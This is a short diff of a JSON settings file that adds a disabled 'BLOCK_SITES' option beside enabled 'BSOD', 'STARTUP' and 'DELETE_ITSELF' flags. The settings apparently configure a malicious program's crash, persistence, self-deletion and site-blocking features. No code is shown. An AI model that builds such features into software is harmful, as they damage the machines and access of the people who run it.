@@ -4,5 +4,6 @@
     "BSOD":true,
     "STARTUP":true,
     "DELETE_ITSELF":true,
+    "BLOCK_SITES":false,
     "MSGBOX":{}
 }
